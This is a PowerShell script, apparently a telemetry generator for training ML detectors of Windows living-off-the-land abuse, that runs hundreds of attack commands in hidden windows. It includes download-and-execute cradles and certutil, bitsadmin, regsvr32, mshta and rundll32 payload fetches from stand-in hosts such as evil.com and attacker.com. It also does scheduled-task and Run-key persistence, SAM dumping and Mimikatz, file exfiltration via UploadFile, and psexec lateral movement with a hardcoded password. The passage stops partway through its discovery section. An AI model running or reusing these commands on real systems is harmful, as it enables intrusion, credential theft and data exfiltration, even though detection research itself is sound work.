# Comprehensive Malicious LOLBin Attack Generator
# Generates realistic malicious LOLBin attack patterns for ML training
# WARNING: This script generates malicious attack patterns. Use only in isolated test environments.

[CmdletBinding()]
param(
    [int]$AttackCount = 1000,
    [int]$DelayBetweenAttacks = 2,
    [switch]$IncludeAllTechniques,
    [string]$LogFile = "malicious_attacks.log"
)

# Color output functions
function Write-AttackLog {
    param([string]$Message, [string]$Color = "Yellow")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] $Message"
    Write-Host $logMessage -ForegroundColor $Color
    Add-Content -Path $LogFile -Value $logMessage
}

function Write-Section {
    param([string]$Title)
    Write-Host "`n" + "="*70 -ForegroundColor Cyan
    Write-Host "  $Title" -ForegroundColor Cyan
    Write-Host "="*70 -ForegroundColor Cyan
    Write-AttackLog "=== $Title ===" "Cyan"
}

# Attack categories
$attackCategories = @{
    'PowerShell_Encoded' = 150
    'PowerShell_Download' = 100
    'PowerShell_Execution' = 100
    'PowerShell_Evasion' = 100
    'CMD_Execution' = 80
    'WMIC_Attacks' = 80
    'CertUtil_Attacks' = 60
    'Regsvr32_Attacks' = 60
    'MSHTA_Attacks' = 60
    'Rundll32_Attacks' = 60
    'CScript_WScript' = 50
    'BITSAdmin' = 50
    'SchTasks_Persistence' = 50
    'Registry_Persistence' = 50
    'Credential_Access' = 50
    'Lateral_Movement' = 50
    'Discovery_Recon' = 50
    'Fileless_Attacks' = 50
    'Advanced_Evasion' = 50
}

# ============================================================================
# POWERSHELL ATTACKS
# ============================================================================

function Invoke-PowerShellEncodedAttack {
    Write-Section "PowerShell Encoded Command Attacks"
    
    $attacks = @(
        # Base64 encoded payloads
        {
            $payload = "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-NonInteractive", "-EncodedCommand", $encoded -WindowStyle Hidden
        },
        {
            $payload = "Invoke-Expression (New-Object Net.WebClient).DownloadString('https://evil.com/shell.ps1')"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy", "Bypass", "-Enc", $encoded -WindowStyle Hidden
        },
        {
            $payload = "Set-Content -Path `$env:TEMP\payload.ps1 -Value (Invoke-WebRequest -Uri 'http://attacker.com/script.ps1').Content; & `$env:TEMP\payload.ps1"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-EncodedCommand", $encoded
        },
        {
            $payload = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload')"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            Start-Process powershell.exe -ArgumentList "-e", $encoded -WindowStyle Hidden
        },
        {
            $payload = "Invoke-WebRequest -Uri 'http://malicious.com/backdoor.exe' -OutFile `$env:TEMP\svchost.exe; Start-Process `$env:TEMP\svchost.exe"
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-NonInteractive", "-EncodedCommand", $encoded -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed PowerShell encoded attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

function Invoke-PowerShellDownloadAttack {
    Write-Section "PowerShell Download Attacks"
    
    $attacks = @(
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'https://evil.com/shell.ps1' -UseBasicParsing).Content" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy", "Bypass", "-Command", "(New-Object Net.WebClient).DownloadFile('http://attacker.com/backdoor.exe', `$env:TEMP\update.exe); Start-Process `$env:TEMP\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:8080/payload')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-Command", "Invoke-WebRequest -Uri 'http://malicious.com/data.exe' -OutFile `$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-Command", "(New-Object System.Net.WebClient).DownloadString('http://evil.com/script.ps1') | IEX" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed PowerShell download attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

function Invoke-PowerShellExecutionAttack {
    Write-Section "PowerShell Execution Attacks"
    
    $attacks = @(
        {
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy", "Bypass", "-File", "`$env:TEMP\malicious.ps1" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "Get-Content `$env:TEMP\payload.ps1 | IEX" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-ExecutionPolicy", "Unrestricted", "-File", "C:\Windows\Temp\script.ps1" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-Command", "& { IEX (Get-Content 'C:\Users\Public\script.ps1' -Raw) }" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-Command", "Invoke-Command -ScriptBlock { IEX (Get-Content '`$env:TEMP\payload.ps1') }" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed PowerShell execution attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

function Invoke-PowerShellEvasionAttack {
    Write-Section "PowerShell Evasion Attacks"
    
    $attacks = @(
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/shell.ps1').Content" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-WindowStyle", "Hidden", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass; IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", "powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')`"" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "`$ExecutionContext.SessionState.LanguageMode = 'FullLanguage'; IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed PowerShell evasion attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# CMD ATTACKS
# ============================================================================

function Invoke-CMDExecutionAttack {
    Write-Section "CMD Execution Attacks"
    
    $attacks = @(
        {
            Start-Process cmd.exe -ArgumentList "/c", "powershell -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "powershell -EncodedCommand $(([Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes('IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'))))" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "certutil -urlcache -split -f http://attacker.com/backdoor.exe $env:TEMP\update.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "bitsadmin /transfer download http://malicious.com/payload.exe $env:TEMP\svchost.exe" -WindowStyle Hidden -ErrorAction SilentlyContinue
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "wmic process call create `"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`"" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "regsvr32 /s /n /u /i:http://malicious.com/payload.sct scrobj.dll" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "mshta http://attacker.com/payload.hta" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "rundll32.exe javascript:`"\\..\\mshtml,RunHTMLApplication `";document.write();new%20ActiveXObject(`"WScript.Shell`").Run(`"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')`");" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            # Execute attack - even if it fails, Sysmon will log the process creation
            $null = & $attack 2>&1
            Write-AttackLog "Executed CMD attack (process created - Sysmon will log)" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            # Note: Even "Access is denied" errors are OK - Sysmon still logs the process creation attempt!
            $errorMsg = $_.Exception.Message
            if ($errorMsg -like "*Access is denied*" -or $errorMsg -like "*Access denied*") {
                Write-AttackLog "Access denied (but Sysmon event was likely created)" "Yellow"
            } else {
                Write-AttackLog "Attack command failed (but Sysmon event was likely created): $errorMsg" "Yellow"
            }
        }
    }
}

# ============================================================================
# WMIC ATTACKS
# ============================================================================

function Invoke-WMICAttack {
    Write-Section "WMIC Attacks"
    
    $attacks = @(
        {
            Start-Process wmic.exe -ArgumentList "process", "call", "create", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process wmic.exe -ArgumentList "process", "call", "create", "cmd.exe /c certutil -urlcache -split -f http://evil.com/backdoor.exe `$env:TEMP\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process wmic.exe -ArgumentList "process", "call", "create", "`"powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command Invoke-Expression (Invoke-WebRequest -Uri 'http://attacker.com/shell.ps1').Content`"" -WindowStyle Hidden
        },
        {
            Start-Process wmic.exe -ArgumentList "process", "call", "create", "bitsadmin /transfer download http://malicious.com/payload.exe `$env:TEMP\svchost.exe" -WindowStyle Hidden
        },
        {
            Start-Process wmic.exe -ArgumentList "/node:localhost", "process", "call", "create", "powershell.exe -NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process wmic.exe -ArgumentList "process", "where", "name='explorer.exe'", "call", "create", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/shell.ps1')" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            # Execute attack - even if it fails, Sysmon will log the process creation
            $null = & $attack 2>&1
            Write-AttackLog "Executed WMIC attack (process created - Sysmon will log)" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            $errorMsg = $_.Exception.Message
            if ($errorMsg -like "*Access is denied*" -or $errorMsg -like "*Access denied*") {
                Write-AttackLog "Access denied (but Sysmon event was likely created)" "Yellow"
            } else {
                Write-AttackLog "Attack command failed (but Sysmon event was likely created): $errorMsg" "Yellow"
            }
        }
    }
}

# ============================================================================
# CERTUTIL ATTACKS
# ============================================================================

function Invoke-CertUtilAttack {
    Write-Section "CertUtil Attacks"
    
    $attacks = @(
        {
            Start-Process certutil.exe -ArgumentList "-urlcache", "-split", "-f", "http://malicious.com/payload.exe", "`$env:TEMP\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process certutil.exe -ArgumentList "-urlcache", "-split", "-f", "https://evil.com/backdoor.exe", "`$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe" -WindowStyle Hidden
        },
        {
            Start-Process certutil.exe -ArgumentList "-decode", "`$env:TEMP\encoded.txt", "`$env:TEMP\payload.exe" -WindowStyle Hidden
        },
        {
            Start-Process certutil.exe -ArgumentList "-encode", "`$env:TEMP\payload.exe", "`$env:TEMP\encoded.txt" -WindowStyle Hidden
        },
        {
            Start-Process certutil.exe -ArgumentList "-urlcache", "-f", "http://attacker.com/payload.ps1", "`$env:TEMP\script.ps1" -WindowStyle Hidden
        },
        {
            Start-Process certutil.exe -ArgumentList "-verifyctl", "-f", "-split", "http://malicious.com/backdoor.exe", "`$env:TEMP\update.exe" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            # Execute attack - even if it fails, Sysmon will log the process creation
            $null = & $attack 2>&1
            Write-AttackLog "Executed CertUtil attack (process created - Sysmon will log)" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            $errorMsg = $_.Exception.Message
            if ($errorMsg -like "*Access is denied*" -or $errorMsg -like "*Access denied*") {
                Write-AttackLog "Access denied (but Sysmon event was likely created)" "Yellow"
            } else {
                Write-AttackLog "Attack command failed (but Sysmon event was likely created): $errorMsg" "Yellow"
            }
        }
    }
}

# ============================================================================
# REGSVR32 ATTACKS
# ============================================================================

function Invoke-Regsvr32Attack {
    Write-Section "Regsvr32 Attacks"
    
    $attacks = @(
        {
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:http://malicious.com/payload.sct", "scrobj.dll" -WindowStyle Hidden
        },
        {
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:https://evil.com/backdoor.sct", "scrobj.dll" -WindowStyle Hidden
        },
        {
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:http://attacker.com/payload.sct", "scrobj.dll" -WindowStyle Hidden
        },
        {
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:http://malicious.com/payload.sct", "scrobj.dll" -WindowStyle Hidden
        },
        {
            Start-Process regsvr32.exe -ArgumentList "/s", "/n", "/u", "/i:http://evil.com/backdoor.sct", "scrobj.dll" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed Regsvr32 attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# MSHTA ATTACKS
# ============================================================================

function Invoke-MSHTAAttack {
    Write-Section "MSHTA Attacks"
    
    $attacks = @(
        {
            Start-Process mshta.exe -ArgumentList "http://malicious.com/payload.hta" -WindowStyle Hidden
        },
        {
            Start-Process mshta.exe -ArgumentList "https://evil.com/backdoor.hta" -WindowStyle Hidden
        },
        {
            Start-Process mshta.exe -ArgumentList "http://attacker.com/payload.hta" -WindowStyle Hidden
        },
        {
            Start-Process mshta.exe -ArgumentList "javascript:document.write();new ActiveXObject('WScript.Shell').Run('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(\"http://malicious.com/payload.ps1\")');" -WindowStyle Hidden
        },
        {
            Start-Process mshta.exe -ArgumentList "vbscript:CreateObject('WScript.Shell').Run('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'),0,true" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed MSHTA attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# RUNDLL32 ATTACKS
# ============================================================================

function Invoke-Rundll32Attack {
    Write-Section "Rundll32 Attacks"
    
    $attacks = @(
        {
            Start-Process rundll32.exe -ArgumentList "javascript:`"\\..\\mshtml,RunHTMLApplication `";document.write();new ActiveXObject('WScript.Shell').Run('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(\"http://malicious.com/payload.ps1\")');" -WindowStyle Hidden
        },
        {
            Start-Process rundll32.exe -ArgumentList "vbscript:`"\\..\\mshtml,RunHTMLApplication `";document.write();CreateObject('WScript.Shell').Run('powershell.exe -NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString(\"http://evil.com/shell.ps1\")'),0,true" -WindowStyle Hidden
        },
        {
            Start-Process rundll32.exe -ArgumentList "url.dll,FileProtocolHandler", "http://malicious.com/payload.hta" -WindowStyle Hidden
        },
        {
            Start-Process rundll32.exe -ArgumentList "shell32.dll,ShellExec_RunDLL", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process rundll32.exe -ArgumentList "javascript:`"\\..\\mshtml.dll,RunHTMLApplication `";eval('var xhr = new ActiveXObject(\"MSXML2.XMLHTTP\"); xhr.open(\"GET\", \"http://malicious.com/payload.ps1\", false); xhr.send(); eval(xhr.responseText);');" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed Rundll32 attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# CSCRIPT/WSCRIPT ATTACKS
# ============================================================================

function Invoke-CScriptWScriptAttack {
    Write-Section "CScript/WScript Attacks"
    
    $tempPath = $env:TEMP
    $attacks = @(
        {
            Start-Process cscript.exe -ArgumentList "//nologo", "//e:vbscript", "$tempPath\payload.vbs" -WindowStyle Hidden
        },
        {
            Start-Process wscript.exe -ArgumentList "//nologo", "//e:vbscript", "$tempPath\backdoor.vbs" -WindowStyle Hidden
        },
        {
            Start-Process cscript.exe -ArgumentList "//nologo", "//e:jscript", "http://malicious.com/payload.js" -WindowStyle Hidden
        },
        {
            Start-Process wscript.exe -ArgumentList "//nologo", "//e:jscript", "http://evil.com/backdoor.js" -WindowStyle Hidden
        },
        {
            Start-Process cscript.exe -ArgumentList "//nologo", "//e:vbscript", "`"javascript:document.write();new ActiveXObject('WScript.Shell').Run('powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString(\"http://malicious.com/payload.ps1\")');`"" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed CScript/WScript attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# BITSADMIN ATTACKS
# ============================================================================

function Invoke-BITSAdminAttack {
    Write-Section "BITSAdmin Attacks"
    
    $attacks = @(
        {
            Start-Process bitsadmin.exe -ArgumentList "/transfer", "download", "http://malicious.com/payload.exe", "`$env:TEMP\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process bitsadmin.exe -ArgumentList "/transfer", "download", "https://evil.com/backdoor.exe", "`$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe" -WindowStyle Hidden
        },
        {
            Start-Process bitsadmin.exe -ArgumentList "/transfer", "downloadJob", "http://attacker.com/payload.ps1", "`$env:TEMP\script.ps1" -WindowStyle Hidden
        },
        {
            Start-Process bitsadmin.exe -ArgumentList "/create", "download", "/download", "/priority", "normal", "http://malicious.com/backdoor.exe", "`$env:TEMP\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process bitsadmin.exe -ArgumentList "/transfer", "download", "http://evil.com/payload.exe", "`$env:TEMP\svchost.exe", "/download", "/priority", "high" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed BITSAdmin attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# SCHTASKS PERSISTENCE ATTACKS
# ============================================================================

function Invoke-SchTasksPersistenceAttack {
    Write-Section "SchTasks Persistence Attacks"
    
    $attacks = @(
        {
            Start-Process schtasks.exe -ArgumentList "/create", "/tn", "WindowsUpdate", "/tr", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')", "/sc", "onlogon", "/f" -WindowStyle Hidden
        },
        {
            Start-Process schtasks.exe -ArgumentList "/create", "/tn", "SystemMaintenance", "/tr", "cmd.exe /c certutil -urlcache -split -f http://evil.com/backdoor.exe `$env:TEMP\update.exe && `$env:TEMP\update.exe", "/sc", "daily", "/st", "00:00", "/f" -WindowStyle Hidden
        },
        {
            Start-Process schtasks.exe -ArgumentList "/create", "/tn", "MicrosoftUpdate", "/tr", "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')", "/sc", "onstart", "/f" -WindowStyle Hidden
        },
        {
            Start-Process schtasks.exe -ArgumentList "/create", "/tn", "WindowsDefender", "/tr", "wmic process call create `"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')`"", "/sc", "hourly", "/f" -WindowStyle Hidden
        },
        {
            Start-Process schtasks.exe -ArgumentList "/create", "/tn", "SecurityUpdate", "/tr", "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll", "/sc", "onidle", "/i", "1", "/f" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed SchTasks persistence attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# REGISTRY PERSISTENCE ATTACKS
# ============================================================================

function Invoke-RegistryPersistenceAttack {
    Write-Section "Registry Persistence Attacks"
    
    $attacks = @(
        {
            Start-Process reg.exe -ArgumentList "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "WindowsUpdate", "/t", "REG_SZ", "/d", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')", "/f" -WindowStyle Hidden
        },
        {
            Start-Process reg.exe -ArgumentList "add", "HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "SystemMaintenance", "/t", "REG_SZ", "/d", "cmd.exe /c certutil -urlcache -split -f http://evil.com/backdoor.exe `$env:TEMP\update.exe && `$env:TEMP\update.exe", "/f" -WindowStyle Hidden
        },
        {
            Start-Process reg.exe -ArgumentList "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce", "/v", "MicrosoftUpdate", "/t", "REG_SZ", "/d", "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')", "/f" -WindowStyle Hidden
        },
        {
            Start-Process reg.exe -ArgumentList "add", "HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce", "/v", "WindowsDefender", "/t", "REG_SZ", "/d", "wmic process call create `"powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')`"", "/f" -WindowStyle Hidden
        },
        {
            Start-Process reg.exe -ArgumentList "add", "HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices", "/v", "SecurityUpdate", "/t", "REG_SZ", "/d", "regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll", "/f" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed Registry persistence attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# CREDENTIAL ACCESS ATTACKS
# ============================================================================

function Invoke-CredentialAccessAttack {
    Write-Section "Credential Access Attacks"
    
    $attacks = @(
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/mimikatz.ps1'); Invoke-Mimikatz -DumpCreds" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoP", "-W", "Hidden", "-Command", "Invoke-Expression (Invoke-WebRequest -Uri 'http://evil.com/credential_dumper.ps1').Content" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "reg save HKLM\SAM `$env:TEMP\sam.save && reg save HKLM\SYSTEM `$env:TEMP\system.save && certutil -urlcache -split -f http://attacker.com/upload.php `$env:TEMP\sam.save" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "Get-WmiObject -Class Win32_UserAccount | Select-Object Name, SID | Out-File `$env:TEMP\users.txt; (New-Object Net.WebClient).UploadFile('http://malicious.com/upload.php', `$env:TEMP\users.txt)" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "vssadmin create shadow /for=C: && copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM `$env:TEMP\sam.backup" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed credential access attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# LATERAL MOVEMENT ATTACKS
# ============================================================================

function Invoke-LateralMovementAttack {
    Write-Section "Lateral Movement Attacks"
    
    $attacks = @(
        {
            Start-Process wmic.exe -ArgumentList "/node:192.168.1.100", "process", "call", "create", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/payload.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process psexec.exe -ArgumentList "\\192.168.1.100", "-u", "Administrator", "-p", "Password123", "-c", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')" -WindowStyle Hidden
        },
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "Invoke-Command -ComputerName 192.168.1.100 -ScriptBlock { IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1') }" -WindowStyle Hidden
        },
        {
            Start-Process wmic.exe -ArgumentList "/node:@C:\computers.txt", "process", "call", "create", "cmd.exe /c certutil -urlcache -split -f http://malicious.com/backdoor.exe `$env:TEMP\update.exe" -WindowStyle Hidden
        },
        {
            Start-Process sc.exe -ArgumentList "\\192.168.1.100", "create", "WindowsUpdate", "binPath=", "powershell.exe -NoProfile -ExecutionPolicy Bypass -Command IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -WindowStyle Hidden
        }
    )
    
    foreach ($attack in $attacks) {
        try {
            & $attack
            Write-AttackLog "Executed lateral movement attack" "Yellow"
            Start-Sleep -Milliseconds (Get-Random -Minimum 500 -Maximum 2000)
        } catch {
            Write-AttackLog "Attack failed: $($_.Exception.Message)" "Red"
        }
    }
}

# ============================================================================
# DISCOVERY/RECON ATTACKS
# ============================================================================

function Invoke-DiscoveryReconAttack {
    Write-Section "Discovery/Recon Attacks"
    
    $attacks = @(
        {
            Start-Process powershell.exe -ArgumentList "-NoProfile", "-Command", "Get-Process | Select-Object Name, Id, Path | Out-File `$env:TEMP\processes.txt; (New-Object Net.WebClient).UploadFile('http://malicious.com/upload.php', `$env:TEMP\processes.txt)" -WindowStyle Hidden
        },
        {
            Start-Process cmd.exe -ArgumentList "/c", "systeminfo > `$env:TEMP\systeminfo.txt && netstat -ano > `$env:TEMP\netstat.txt && certutil -urlcache -split -f http://evil.com/upload.php `$env:TEMP\systeminfo.txt" -WindowStyle Hidden
        },
